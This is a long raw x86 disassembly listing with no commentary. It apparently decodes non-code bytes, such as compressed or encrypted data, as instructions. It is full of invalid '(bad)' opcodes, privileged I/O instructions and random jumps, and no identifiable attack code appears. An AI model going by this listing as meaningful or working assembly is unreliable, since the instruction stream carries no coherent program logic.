  41da6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da6e:	sbb    BYTE PTR [eax],bh
  41da70:	mov    dl,BYTE PTR [edx]
  41da72:	pop    esp
  41da73:	test   al,0x78
  41da75:	pop    ebx
  41da76:	nop
  41da77:	sbb    eax,0x96e369c4
  41da7c:	pop    edx
  41da7d:	leave  
  41da7e:	std    
  41da7f:	add    al,ch
  41da81:	sub    DWORD PTR [esi-0x17],edx
  41da84:	mov    DWORD PTR [edi+0x6e33c4c9],esi
  41da8a:	(bad)  
  41da8b:	fstp   TBYTE PTR [esi+ebx*4+0x4233b5b6]
  41da92:	pushf  
  41da93:	loopne 0x41dadb
  41da95:	bound  edi,QWORD PTR [eax-0x41]
  41da98:	adc    eax,0x37b90df9
  41da9d:	or     ecx,DWORD PTR [edi]
  41da9f:	push   0x73
  41daa1:	mov    edi,0x2fab791e
  41daa6:	xchg   dh,al
  41daa8:	fs jb  0x41dac0
  41daab:	cli    
  41daac:	jno    0x41da7b
  41daae:	pushf  
  41daaf:	and    al,BYTE PTR [ecx-0x4eb2c38c]
  41dab5:	aad    0x25
  41dab7:	aas    
  41dab8:	add    eax,DWORD PTR [edi-0x55]
  41dabb:	dec    ecx
  41dabc:	enter  0xa82,0xdf
  41dac0:	xor    eax,0x4da0ec4
  41dac5:	add    ecx,edx
  41dac7:	int    0xd2
  41dac9:	push   ds
  41daca:	cli    
  41dacb:	pushf  
  41dacc:	add    DWORD PTR [edx],eax
  41dace:	jp     0x41db49
  41dad0:	pop    ds
  41dad1:	idiv   DWORD PTR [edi-0x45]
  41dad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad5:	mov    WORD PTR [edi+edi*8],gs
  41dad8:	mov    bl,0x13
  41dada:	push   esp
  41dadb:	shl    ebx,0x5e
  41dade:	xchg   ebp,eax
  41dadf:	mov    eax,ds:0x6ca5d51
  41dae4:	cs jnp 0x41dae9
  41dae7:	inc    edx
  41dae8:	bound  ecx,QWORD PTR [esi+0x325b0c9e]
  41daee:	in     al,dx
  41daef:	mov    DWORD PTR [edx-0x131765ac],esi
  41daf5:	or     ebp,DWORD PTR [eax-0x7130a727]
  41dafb:	xor    esi,DWORD PTR [edx+0x2a522915]
  41db01:	or     dh,BYTE PTR [esi]
  41db03:	cmp    BYTE PTR ds:0xe3bca141,0xc2
  41db0a:	in     al,dx
  41db0b:	jecxz  0x41db26
  41db0d:	outs   dx,BYTE PTR ds:[esi]
  41db0e:	es push cs
  41db10:	dec    edi
  41db11:	sbb    BYTE PTR [edx+edx*4+0x1f],ch
  41db15:	xor    dh,al
  41db17:	loope  0x41dae8
  41db19:	xchg   ebp,eax
  41db1a:	jp     0x41db70
  41db1c:	push   0xffffffa7
  41db1e:	mov    bl,0xf5
  41db20:	repnz xchg esi,eax
  41db22:	jp     0x41db85
  41db24:	and    al,0xe7
  41db26:	mov    bl,0x69
  41db28:	lahf   
  41db29:	pop    es
  41db2a:	add    eax,0xaecc8cdf
  41db2f:	and    ebp,DWORD PTR [eax]
  41db31:	push   ecx
  41db32:	call   FWORD PTR [esi+0x36]
  41db35:	pop    ds
  41db36:	cmp    DWORD PTR [edi-0x7b],ebx
  41db39:	stos   BYTE PTR es:[edi],al
  41db3a:	out    dx,al
  41db3b:	or     DWORD PTR [ebx-0x4312e74],edi
  41db41:	popa   
  41db42:	push   edx
  41db43:	cmc    
  41db44:	fcom   st(0)
  41db46:	jb     0x41db52
  41db48:	dec    edx
  41db49:	pop    ebp
  41db4a:	dec    edi
  41db4b:	sbb    edx,DWORD PTR [ebp+0xc]
  41db4e:	push   eax
  41db4f:	in     al,dx
  41db50:	or     eax,0x848759bb
  41db55:	mov    ah,0xe4
  41db57:	push   ds
  41db58:	gs stos DWORD PTR es:[edi],eax
  41db5a:	(bad)  
  41db5b:	mov    ds:0x16eccbc3,eax
  41db60:	dec    edi
  41db61:	jge    0x41daef
  41db63:	ja     0x41db26
  41db65:	adc    al,bl
  41db67:	popa   
  41db68:	jb     0x41db3f
  41db6a:	xor    cl,ch
  41db6c:	ret    0xd4f7
  41db6f:	jmp    0xdfc2b7b6
  41db74:	mov    eax,0x96d620e8
  41db79:	hlt    
  41db7a:	cmp    al,0x4f
  41db7c:	add    DWORD PTR [eax-0x7c0ecaf5],0x5f
  41db83:	inc    ecx
  41db84:	popa   
  41db85:	fld    DWORD PTR [ebx-0x329a32b5]
  41db8b:	xor    ch,0x82
  41db8e:	mov    bh,0xe7
  41db90:	cmp    DWORD PTR [ecx+edx*8],0x29c0a838
  41db97:	les    esi,FWORD PTR [edi]
  41db99:	inc    edi
  41db9a:	jmp    0x8a55:0x9ea3edb1
  41dba1:	dec    edx
  41dba2:	fwait
  41dba3:	or     BYTE PTR [ecx-0x5e],0xbd
  41dba7:	mov    esi,0xd540e973
  41dbac:	or     edx,DWORD PTR [ecx+0x4b]
  41dbaf:	sbb    DWORD PTR [edx-0x6b184a83],ebx
  41dbb5:	xchg   esi,eax
  41dbb6:	cli    
  41dbb7:	test   al,0x9
  41dbb9:	out    0x44,eax
  41dbbb:	xchg   esp,eax
  41dbbc:	in     eax,0x5f
  41dbbe:	in     al,dx
  41dbbf:	sub    DWORD PTR [eax+0x55],eax
  41dbc2:	adc    al,0x0
  41dbc4:	mov    eax,ds:0x8ee412a7
  41dbc9:	iret   
  41dbca:	aaa    
  41dbcb:	push   edx
  41dbcc:	fidiv  DWORD PTR es:[esi+eax*2+0x18bb35b]
  41dbd4:	dec    ecx
  41dbd5:	es pop ds
  41dbd7:	push   eax
  41dbd8:	repz jne 0x41dbbe
  41dbdb:	shr    ch,cl
  41dbdd:	push   esi
  41dbdf:	(bad)  
  41dbe1:	push   0xe4b08c60
  41dbe6:	into   
  41dbe7:	xchg   esi,eax
  41dbe8:	(bad)  
  41dbe9:	push   ss
  41dbea:	repz lock xchg edi,eax
  41dbed:	or     al,0xef
  41dbef:	mov    bh,0xc0
  41dbf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf2:	push   ebx
  41dbf3:	add    eax,esi
  41dbf5:	neg    BYTE PTR [ecx-0x4caa9d65]
  41dbfb:	leave  
  41dbfc:	ret    0xa531
  41dbff:	rol    DWORD PTR [eax-0x13a3e2de],cl
  41dc05:	sbb    al,0x18
  41dc07:	and    bl,BYTE PTR [esi+0x7a]
  41dc0a:	mov    DWORD PTR [ebx],edx
  41dc0c:	sbb    dh,BYTE PTR [eax-0x613f67ef]
  41dc12:	lds    eax,FWORD PTR [ebp-0x35]
  41dc15:	arpl   WORD PTR [ecx-0x5],si
  41dc18:	iret   
  41dc19:	push   ds
  41dc1a:	cdq    
  41dc1b:	popa   
  41dc1c:	sbb    dl,dl
  41dc1e:	jg     0x41dc10
  41dc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc21:	add    eax,0xad08ceaf
  41dc26:	jl     0x41dc07
  41dc28:	or     edi,DWORD PTR [edx+ebx*1+0x4aa33c9a]
  41dc2f:	imul   ebp,DWORD PTR [eax+0x45402868],0xffffff9d
  41dc36:	ficom  WORD PTR [eax]
  41dc38:	inc    edi
  41dc39:	loope  0x41dbdc
  41dc3b:	mov    edx,0x4b6e9d2
  41dc40:	sar    BYTE PTR [ecx],0x5a
  41dc43:	das    
  41dc44:	scas   al,BYTE PTR es:[edi]
  41dc45:	in     al,dx
  41dc46:	jno    0x41dc70
  41dc48:	stos   DWORD PTR es:[edi],eax
  41dc49:	adc    dl,0xde
  41dc4c:	stos   DWORD PTR es:[edi],eax
  41dc4d:	aam    0x45
  41dc4f:	js     0x41dc43
  41dc51:	icebp  
  41dc52:	sti    
  41dc53:	add    eax,0xcc8b2d50
  41dc58:	xchg   edi,eax
  41dc59:	in     eax,dx
  41dc5a:	mov    edi,0xae46a73b
  41dc5f:	loop   0x41dc0f
  41dc61:	pop    esi
  41dc62:	cli    
  41dc63:	mov    edx,0x57f784d5
  41dc68:	outs   dx,DWORD PTR ds:[esi]
  41dc69:	lds    ecx,FWORD PTR ds:0x9baa5064
  41dc6f:	ins    DWORD PTR es:[edi],dx
  41dc70:	push   cs
  41dc71:	popf   
  41dc72:	inc    edi
  41dc73:	pushf  
  41dc74:	pop    ecx
  41dc75:	cmp    BYTE PTR [ecx],dl
  41dc77:	fwait
  41dc78:	jo     0x41dcd0
  41dc7a:	in     al,dx
  41dc7b:	add    al,0x1f
  41dc7d:	pop    esi
  41dc7e:	xchg   edx,eax
  41dc7f:	lahf   
  41dc80:	pop    ebp
  41dc81:	mov    dh,0x12
  41dc83:	push   es
  41dc84:	xchg   ch,dl
  41dc86:	(bad)  
  41dc87:	and    eax,0xab1ba472
  41dc8c:	ret    
  41dc8d:	dec    eax
  41dc8e:	stos   BYTE PTR es:[edi],al
  41dc8f:	dec    ebx
  41dc90:	ins    DWORD PTR es:[edi],dx
  41dc91:	lea    ebx,[eax+0x1a718bf0]
  41dc97:	call   0x6d1a:0x1b8c9aae
  41dc9e:	nop
  41dc9f:	inc    ecx
  41dca0:	mov    dl,0x59
  41dca2:	mov    ebp,0x15461066
  41dca7:	mov    ah,BYTE PTR [ecx]
  41dca9:	stos   DWORD PTR es:[edi],eax
  41dcaa:	pop    es
  41dcab:	cwde   
  41dcac:	out    0x56,eax
  41dcae:	lea    ecx,ds:0xb27b5fdf
  41dcb4:	gs mov eax,0x8b75ac88
  41dcba:	jno    0x41dcb9
  41dcbc:	lock mov ds:0x5c197939,eax
  41dcc2:	jg     0x41dccc
  41dcc4:	pop    eax
  41dcc5:	mov    dl,0x24
  41dcc7:	fstp   DWORD PTR [esi]
  41dcc9:	xchg   edx,eax
  41dcca:	adc    DWORD PTR [ebp+0x65521207],edx
  41dcd0:	add    DWORD PTR [edi],ebp
  41dcd2:	repz cmp esi,DWORD PTR [ebp+ebx*1-0x18f9e21]
  41dcda:	push   edi
  41dcdb:	jmp    0x4e92:0x9b186ce3
  41dce2:	bound  ebx,QWORD PTR [eax-0x313a7eb1]
  41dce8:	adc    BYTE PTR [ebx+0x76],cl
  41dceb:	adc    BYTE PTR ds:0xce09d834,ch
  41dcf1:	dec    esp
  41dcf2:	and    DWORD PTR [edi-0x2b],ecx
  41dcf5:	mov    WORD PTR [eax+0x43],fs
  41dcf8:	repnz pusha 
  41dcfa:	xchg   edi,eax
  41dcfb:	idiv   BYTE PTR [edi+0x430da999]
  41dd01:	jecxz  0x41dd00
  41dd03:	in     al,0x21
  41dd05:	loope  0x41dd82
  41dd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd08:	ror    DWORD PTR [ebx+edi*4+0x2a],cl
  41dd0c:	dec    edx
  41dd0d:	repz cmc 
  41dd0f:	enter  0xe34a,0xd5
  41dd13:	add    BYTE PTR [ecx],0xf7
  41dd16:	bound  edx,QWORD PTR [ebp-0x15c498b0]
  41dd1c:	pop    esi
  41dd1d:	sahf   
  41dd1e:	out    0x9f,al
  41dd20:	xlat   BYTE PTR ds:[ebx]
  41dd21:	or     al,0x8f
  41dd23:	inc    edx
  41dd24:	(bad)  
  41dd25:	mov    ecx,0xb9bb5949
  41dd2a:	bound  esp,QWORD PTR [ebx*8+0x7fc72f39]
  41dd31:	pop    esi
  41dd32:	jl     0x41dd49
  41dd34:	dec    ecx
  41dd35:	pop    esp
  41dd36:	int3   
  41dd37:	and    BYTE PTR [edi+0x39f1bc94],0x33
  41dd3e:	push   eax
  41dd3f:	aam    0x87
  41dd41:	out    0xca,eax
  41dd43:	dec    BYTE PTR [ecx-0x23]
  41dd46:	push   es
  41dd47:	adc    al,0x44
  41dd49:	sub    al,0xf6
  41dd4b:	mov    ebp,0x27a75f52
  41dd50:	sub    DWORD PTR [ebx+esi*2-0x38],ebp
  41dd54:	jp     0x41ddb4
  41dd56:	mov    cl,0x4a
  41dd58:	sub    eax,0x94563df9
  41dd5d:	inc    esi
  41dd5e:	rcl    BYTE PTR [ebp-0x2a],cl
  41dd61:	xor    DWORD PTR [ebx+0x6],eax
  41dd64:	fsub   QWORD PTR [esi+0x32ca484e]
  41dd6a:	push   ds
  41dd6b:	jecxz  0x41dd1b
  41dd6d:	inc    edx
  41dd6e:	es retf 0x9ea5
  41dd72:	sub    ah,BYTE PTR [edi*2+0x6a3997aa]
  41dd79:	sbb    al,0x29
  41dd7b:	sar    BYTE PTR [esi],cl
  41dd7d:	stos   DWORD PTR es:[edi],eax
  41dd7e:	and    al,0x24
  41dd80:	sub    BYTE PTR [eax+0x36],bh
  41dd83:	repz fldl2e 
  41dd86:	cdq    
  41dd87:	xchg   edi,eax
  41dd88:	cmc    
  41dd89:	lock mov DWORD PTR [eax+eax*4+0x38d137d0],esi
  41dd91:	fimul  WORD PTR [eax-0x3c]
  41dd94:	int    0x3a
  41dd96:	pop    es
  41dd97:	cmp    BYTE PTR [ebp-0x70273e8a],ch
  41dd9d:	pop    edx
  41dd9e:	dec    edi
  41dd9f:	push   ebx
  41dda0:	push   ebx
  41dda1:	psrld  mm0,mm6
  41dda4:	fisttp DWORD PTR [edx]
  41dda6:	pop    ebp
  41dda7:	push   eax
  41dda8:	clc    
  41dda9:	xor    eax,eax
  41ddab:	jmp    0x41dda3
  41ddad:	(bad)  
  41ddae:	jg     0x41de09
  41ddb0:	aad    0x57
  41ddb2:	and    BYTE PTR [esi+0x1a],dl
  41ddb5:	jne    0x41ddf5
  41ddb7:	mov    ebp,0xf1002b51
  41ddbc:	rcl    BYTE PTR [edx],cl
  41ddbe:	jg     0x41dd6c
  41ddc0:	int    0x5c
  41ddc2:	fild   DWORD PTR [ebp-0x16]
  41ddc5:	xchg   ebp,eax
  41ddc6:	mov    ch,0x93
  41ddc8:	stos   BYTE PTR es:[edi],al
  41ddc9:	and    dh,BYTE PTR [ebp+0x46bed329]
  41ddcf:	push   ecx
  41ddd0:	sub    BYTE PTR [eax],dh
  41ddd2:	data16 (bad) 
  41ddd5:	sbb    al,0x4e
  41ddd7:	hlt    
  41ddd8:	jle    0x41dda9
  41ddda:	ret    0x6841
  41dddd:	push   ss
  41ddde:	cli    
  41dddf:	inc    edx
  41dde0:	adc    ah,BYTE PTR [ecx+0x6724436b]
  41dde6:	xchg   DWORD PTR [edx+esi*1+0x25],eax
  41ddea:	adc    DWORD PTR [ecx+0x57],esp
  41dded:	out    0xfd,al
  41ddef:	adc    al,0xc0
  41ddf1:	and    cl,BYTE PTR [edx-0x76]
  41ddf4:	mov    edi,0x44775b2
  41ddf9:	sti    
  41ddfa:	xchg   edx,edi
  41ddfc:	mov    esi,0xbdaa97b2
  41de01:	ins    BYTE PTR es:[edi],dx
  41de02:	add    BYTE PTR [ebp-0x57426c83],ch
  41de08:	cwde   
  41de09:	sbb    DWORD PTR [ebp+0x128dc67],0xffffff8e
  41de10:	mov    ebx,0x7a83f2e8
  41de15:	int    0x28
  41de17:	xchg   esp,eax
  41de18:	adc    eax,0xad65fb5a
  41de1d:	test   ebp,eax
  41de1f:	sbb    ecx,DWORD PTR [ecx+0x15]
  41de22:	pop    es
  41de23:	and    DWORD PTR [eax+0x7e2dd262],edi
  41de29:	pop    ss
  41de2a:	js     0x41de2d
  41de2c:	cmp    DWORD PTR [ebx],esi
  41de2e:	fmul   QWORD PTR [ecx]
  41de30:	int3   
  41de31:	pushf  
  41de32:	loopne 0x41de18
  41de34:	or     eax,0x278a5de0
  41de39:	outs   dx,BYTE PTR ds:[esi]
  41de3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de3b:	sbb    eax,0x40869b6d
  41de40:	neg    BYTE PTR [ebx+0x7bc1f7d9]
  41de46:	jo     0x41de20
  41de48:	and    BYTE PTR [edx-0x13],bh
  41de4b:	in     eax,dx
  41de4c:	mov    dl,0x2b
  41de4e:	push   esi
  41de4f:	int3   
  41de50:	mov    ecx,0xaaab355
  41de55:	lods   al,BYTE PTR ds:[esi]
  41de56:	sbb    ah,ch
  41de58:	and    edi,DWORD PTR [eax-0x71]
  41de5b:	and    eax,DWORD PTR [ebx+0x737fbbd4]
  41de61:	dec    eax
  41de62:	icebp  
  41de63:	inc    esp
  41de64:	test   BYTE PTR [edi],cl
  41de66:	xchg   esp,eax
  41de67:	mov    ch,0xaa
  41de69:	pop    ecx
  41de6a:	in     eax,0x65
  41de6c:	sbb    eax,0xcf0ac38c
  41de71:	dec    eax
  41de72:	push   esp
  41de73:	mov    BYTE PTR [esi+0x4c],0x3d
  41de77:	or     bl,BYTE PTR [esi-0x80]
  41de7a:	pavgw  mm5,QWORD PTR [edx-0x36c96975]
  41de81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de82:	dec    ecx
  41de83:	mov    bh,0x44
  41de85:	and    ch,al
  41de87:	ror    DWORD PTR [ebp+0x9],0xac
  41de8b:	mov    gs,WORD PTR [edx-0x53]
  41de8e:	sbb    eax,0x96c4692c
  41de93:	mov    al,ds:0xca542a28
  41de98:	adc    eax,DWORD PTR ds:0x406625c2
  41de9e:	add    DWORD PTR [edx+0xc],edx
  41dea1:	addr16 ds mov edx,0xf8b3d0de
  41dea8:	ret    0x4079
  41deab:	jbe    0x41df12
  41dead:	mov    cl,0xba
  41deaf:	adc    DWORD PTR [esi+0x7a],ebp
  41deb2:	push   ds
  41deb3:	mov    ebp,0x9eb4d643
  41deb8:	jmp    0x90a5:0x288fe7e7
  41debf:	add    BYTE PTR [edx],al
  41dec1:	cmp    BYTE PTR [esi-0x5c3ad68a],ah
  41dec7:	dec    ebp
  41dec8:	push   eax
  41dec9:	test   BYTE PTR [ecx-0x43addca8],dh
  41decf:	hlt    
  41ded0:	jo     0x41de5d
  41ded2:	cmp    bh,cl
  41ded4:	outs   dx,DWORD PTR ds:[esi]
  41ded5:	shr    BYTE PTR [edx],1
  41ded7:	fsubr  st,st(3)
  41ded9:	jge    0x41df27
  41dedb:	push   esp
  41dedc:	cmp    eax,0xbfbecfb5
  41dee1:	jecxz  0x41df40
  41dee3:	and    cl,cl
  41dee5:	and    dh,BYTE PTR ds:0x8e9567b2
  41deeb:	data16 int 0xf4
  41deee:	cmp    al,0x8
  41def0:	scas   eax,DWORD PTR es:[edi]
  41def1:	addr16 pop ds
  41def3:	idiv   DWORD PTR [eax]
  41def5:	mov    edx,0x6ff72e8c
  41defa:	(bad)  
  41defc:	loop   0x41df3d
  41defe:	sub    DWORD PTR [edx-0xca55b84],ecx
  41df04:	xchg   DWORD PTR [ebx-0x7d078c67],edi
  41df0a:	pop    ebp
  41df0b:	outs   dx,DWORD PTR ds:[esi]
  41df0c:	pop    ss
  41df0d:	ret    0x3795
  41df10:	or     eax,0xa7e1b652
  41df15:	adc    al,bl
  41df17:	retf   
  41df18:	mov    DWORD PTR [edi+edx*8],edi
  41df1b:	fsubr  DWORD PTR [eax]
  41df1d:	mov    esi,0x23939fa6
  41df22:	test   ecx,0x7d6aa915
  41df28:	int3   
  41df29:	add    al,BYTE PTR [ecx+0x9]
  41df2c:	lods   al,BYTE PTR ds:[esi]
  41df2d:	adc    BYTE PTR [ecx],bh
  41df2f:	retf   
  41df30:	dec    eax
  41df31:	es jl  0x41dedd
  41df34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df35:	adc    esi,edi
  41df37:	cmc    
  41df38:	mov    dl,0xa
  41df3a:	data16 jg 0x41dfbb
  41df3d:	aas    
  41df3e:	push   ss
  41df3f:	lock mov edx,0x7d2b4ccd
  41df45:	fimul  WORD PTR [edx]
  41df47:	mov    ch,0x6b
  41df49:	push   edi
  41df4a:	daa    
  41df4b:	lods   eax,DWORD PTR ds:[esi]
  41df4c:	lds    edx,FWORD PTR [ecx]
  41df4e:	lock dec edx
  41df50:	add    al,0xbf
  41df52:	in     eax,dx
  41df53:	mov    edi,esi
  41df55:	add    edx,eax
  41df57:	dec    edx
  41df58:	inc    edx
  41df59:	pop    ds
  41df5a:	shl    DWORD PTR [ebx-0x2b],cl
  41df5d:	pusha  
  41df5e:	scas   eax,DWORD PTR es:[edi]
  41df5f:	cmp    ebx,DWORD PTR [edi+0x63]
  41df62:	daa    
  41df63:	xor    al,0x98
  41df65:	sub    ch,ah
  41df67:	js     0x41df14
  41df69:	inc    ebx
  41df6a:	pop    esi
  41df6b:	sbb    dh,ch
  41df6d:	mov    al,0x8c
  41df6f:	sub    al,0x11
  41df71:	cmp    eax,DWORD PTR [edx-0x67]
  41df74:	int    0xe8
  41df76:	xor    DWORD PTR [edx+0x6b],edi
  41df79:	test   ebx,ebx
  41df7b:	push   0x82ae339f
  41df80:	inc    esp
  41df81:	dec    ebp
  41df82:	test   BYTE PTR [ebx+esi*8-0x42bed08a],ah
  41df89:	sbb    eax,0xdb00839b
  41df8e:	rol    DWORD PTR [ecx+0x3e494bc8],cl
  41df94:	push   ebp
  41df95:	popa   
  41df96:	add    DWORD PTR [edi+0x1f3c315f],edx
  41df9c:	mov    bh,0xb7
  41df9e:	int3   
  41df9f:	lahf   
  41dfa0:	xchg   esp,eax
  41dfa1:	xchg   edi,eax
  41dfa2:	adc    eax,0xdf40eed3
  41dfa7:	mov    ch,0x61
  41dfa9:	int3   
  41dfaa:	xor    ah,al
  41dfac:	sysret 
  41dfae:	dec    edx
  41dfaf:	sub    DWORD PTR [edi],esi
  41dfb1:	mov    esp,0xb2267f38
  41dfb6:	mov    cl,0x29
  41dfb8:	mov    ebp,edx
  41dfba:	push   ebp
  41dfbb:	mov    ch,0x6d
  41dfbd:	fistp  DWORD PTR [edi+eiz*8+0x79]
  41dfc1:	adc    ch,cl
  41dfc3:	repz mov ch,BYTE PTR [edi]
  41dfc6:	add    al,0xf6
  41dfc8:	jmp    0xaf704e6b
  41dfcd:	xor    edx,ebx
  41dfcf:	repnz outs dx,BYTE PTR ds:[esi]
  41dfd1:	inc    edi
  41dfd2:	xchg   DWORD PTR fs:[ecx],edi
  41dfd5:	int3   
  41dfd6:	lea    ebp,ds:0x113194c6
  41dfdc:	fstp   QWORD PTR cs:[esi+0x49]
  41dfe0:	mov    ds:0xba1b4e4e,eax
  41dfe5:	dec    esi
  41dfe6:	aam    0xcb
  41dfe8:	(bad)  
  41dfe9:	mov    ecx,0xc2a3c36c
  41dfee:	add    BYTE PTR [ebx-0x4e64a71],ch
  41dff4:	inc    ebp
  41dff5:	jl     0x41dfd1
  41dff7:	sbb    al,0xd9
  41dff9:	test   al,0xeb
  41dffb:	add    ecx,DWORD PTR [esi]
  41dffd:	add    BYTE PTR [ebp+ecx*2-0x70],0xf4
  41e002:	clc    
  41e003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e004:	lea    esi,[ecx+0x7e]
  41e007:	test   DWORD PTR [ecx+0x29],esp
  41e00a:	mov    al,ds:0xa2e36c89
  41e00f:	test   DWORD PTR [eax-0x13],ebx
  41e012:	sub    eax,0x6cf80ab1
  41e017:	jns    0x41e028
  41e019:	dec    ecx
  41e01a:	in     eax,dx
  41e01b:	aaa    
  41e01c:	and    eax,DWORD PTR [ebp-0x6d]
  41e01f:	sbb    eax,0xcd2d7493
  41e024:	mov    eax,ds:0xc4902d8
  41e029:	mov    bl,0xc7
  41e02b:	repnz and ch,bh
  41e02e:	mov    dh,0x33
  41e030:	out    dx,eax
  41e031:	into   
  41e032:	repnz pop esp
  41e034:	add    eax,0xec32ab63
  41e039:	jl     0x41dfcb
  41e03b:	leave  
  41e03c:	(bad)  
  41e03d:	je     0x41e0a4
  41e03f:	mov    WORD PTR [esi],?
  41e041:	xchg   ecx,eax
  41e042:	pop    ebp
  41e043:	jno    0x41e06e
  41e045:	cld    
  41e046:	or     BYTE PTR [eax],cl
  41e048:	aas    
  41e049:	lods   eax,DWORD PTR ds:[esi]
  41e04a:	aad    0xd7
  41e04c:	cmp    eax,0x70e23da3
  41e051:	xchg   ebx,eax
  41e052:	outs   dx,BYTE PTR ds:[esi]
  41e053:	leave  
  41e054:	ins    BYTE PTR es:[edi],dx
  41e055:	aaa    
  41e056:	cmp    ecx,DWORD PTR [ebx+0x59]
  41e059:	in     eax,dx
  41e05a:	fxch   st(4)
  41e05c:	pop    es
  41e05d:	mov    al,0xf1
  41e05f:	jle    0x41e08f
  41e061:	sbb    edx,edi
  41e063:	mov    cl,0x6b
  41e065:	stos   DWORD PTR es:[edi],eax
  41e066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e067:	rcr    BYTE PTR [edi],0x85
  41e06a:	jno    0x41e048
  41e06c:	(bad)  
  41e06d:	jbe    0x41e007
  41e06f:	mov    edi,0xf286b252
  41e074:	cmp    ebp,DWORD PTR [ebp+0x3c663bbd]
  41e07a:	xchg   ecx,eax
  41e07b:	push   DWORD PTR [eax+0x37114316]
  41e081:	push   0xffffffb5
  41e083:	jns    0x41e02e
  41e085:	or     al,0xf1
  41e087:	jle    0x41e0dc
  41e089:	lods   eax,DWORD PTR ds:[esi]
  41e08a:	cmp    DWORD PTR [edi],ecx
  41e08c:	xchg   ebp,eax
  41e08d:	jno    0x41e026
  41e08f:	out    0x1c,al
  41e091:	faddp  st(7),st
  41e093:	fld    QWORD PTR [edi-0xe]
  41e096:	mov    al,0x27
  41e098:	fdivr  st(7),st
  41e09a:	pushf  
  41e09b:	test   al,0xd4
  41e09d:	out    0xf4,al
  41e09f:	cmp    dh,ch
  41e0a1:	pop    esp
  41e0a2:	loope  0x41e10c
  41e0a4:	out    0xfe,eax
  41e0a6:	cmp    eax,0x202c084e
  41e0ab:	retf   
  41e0ac:	out    dx,al
  41e0ad:	and    cl,ah
  41e0af:	jecxz  0x41e126
  41e0b1:	les    ebp,FWORD PTR [eax+0x15]
  41e0b4:	cwde   
  41e0b5:	sahf   
  41e0b6:	les    edx,FWORD PTR [ebp-0x4b91f2b4]
  41e0bc:	sbb    eax,0xd1cd1648
  41e0c1:	fild   WORD PTR [ecx-0x50baa3cc]
  41e0c7:	xchg   ecx,eax
  41e0c8:	mov    edx,0x9a74e5d7
  41e0cd:	(bad)  
  41e0ce:	hlt    
  41e0cf:	bound  esp,QWORD PTR [edi]
  41e0d1:	jg     0x41e11f
  41e0d3:	pop    ebp
  41e0d4:	shl    DWORD PTR [eax*1+0x27f42c6b],0x62
  41e0dc:	js     0x41e090
  41e0de:	int3   
  41e0df:	mov    edx,0x8776dd7a
  41e0e4:	mov    eax,ds:0x474ec5b5
  41e0e9:	out    dx,al
  41e0ea:	cmp    eax,0x84fac40e
  41e0ef:	mov    bl,0x73
  41e0f1:	dec    edi
  41e0f2:	add    ecx,DWORD PTR [edi]
  41e0f4:	fucompp 
  41e0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0f7:	sbb    al,0x3c
  41e0f9:	ret    
  41e0fa:	fwait
  41e0fb:	xlat   BYTE PTR ds:[ebx]
  41e0fc:	fcomp  DWORD PTR [ebp-0x68]
  41e0ff:	test   al,0xdb
  41e101:	int    0xa5
  41e103:	or     ebp,DWORD PTR [edx-0x63]
  41e106:	in     al,0x52
  41e108:	sub    ah,BYTE PTR [ecx]
  41e10a:	sub    DWORD PTR [ebp+0x69],ecx
  41e10d:	dec    ecx
  41e10e:	and    BYTE PTR [edi],dh
  41e110:	mov    eax,ds:0x8cefb11a
  41e115:	lahf   
  41e116:	mov    ds:0x97fd8359,eax
  41e11b:	int3   
  41e11c:	dec    edx
  41e11d:	bound  edx,QWORD PTR gs:[edi+0x4102078c]
  41e124:	daa    
  41e125:	inc    edx
  41e126:	lods   al,BYTE PTR ds:[esi]
  41e127:	mov    ebp,0x8ae7b933
  41e12c:	icebp  
  41e12d:	imul   edx,ebp,0x7d
  41e130:	xchg   edx,eax
  41e131:	aaa    
  41e132:	cwde   
  41e133:	inc    ebx
  41e134:	jbe    0x41e131
  41e136:	cdq    
  41e137:	repz icebp 
  41e139:	scas   al,BYTE PTR es:[edi]
  41e13a:	mov    dh,0xbd
  41e13c:	scas   al,BYTE PTR es:[edi]
  41e13d:	fadd   QWORD PTR [ebx+0x4b2c1f88]
  41e143:	adc    ah,ah
  41e145:	repz jmp 0x41e0e6
  41e148:	jg     0x41e0cd
  41e14a:	dec    ebp
  41e14b:	pop    esp
  41e14c:	in     eax,dx
  41e14d:	adc    DWORD PTR [ebx-0x43908e45],0xffffffcb
  41e154:	or     eax,0x5017bcb
  41e159:	inc    DWORD PTR [ecx+0x74c88c95]
  41e15f:	jg     0x41e138
  41e161:	in     al,dx
  41e162:	or     bh,0xdc
  41e165:	jmp    0xb2f1:0x6c9afa0e
  41e16c:	inc    eax
  41e16d:	fld    st(4)
  41e16f:	into   
  41e170:	or     DWORD PTR [eax-0x6af11b42],ecx
  41e176:	fxch   st(2)
  41e178:	data16 mov ds:0xc46d3f13,al
  41e17e:	fisttp DWORD PTR [ebp+0x1d]
  41e181:	in     eax,0x50
  41e183:	test   DWORD PTR ds:0xc3e3eed,edi
  41e189:	pop    ss
  41e18a:	ja     0x41e12b
  41e18c:	inc    esp
  41e18d:	inc    ecx
  41e18e:	or     ebx,DWORD PTR [ecx+0x26]
  41e191:	retf   
  41e192:	pop    es
  41e193:	fidiv  WORD PTR [edx]
  41e195:	xchg   edi,eax
  41e196:	dec    eax
  41e197:	and    eax,0x34a27023
  41e19c:	and    BYTE PTR [ebx-0x24],dl
  41e19f:	(bad)  
  41e1a0:	push   edi
  41e1a1:	or     bh,cl
  41e1a3:	push   esi
  41e1a4:	or     eax,DWORD PTR [edx+0x74]
  41e1a7:	cmp    eax,0x1d116f2a
  41e1ac:	je     0x41e1c4
  41e1ae:	mov    cl,0xb0
  41e1b0:	sub    eax,0x7455ce06
  41e1b5:	push   0xef86b7e5
  41e1ba:	mov    bl,0x6c
  41e1bc:	xchg   BYTE PTR [esi+0x35],dl
  41e1bf:	loop   0x41e211
  41e1c1:	adc    al,0xb2
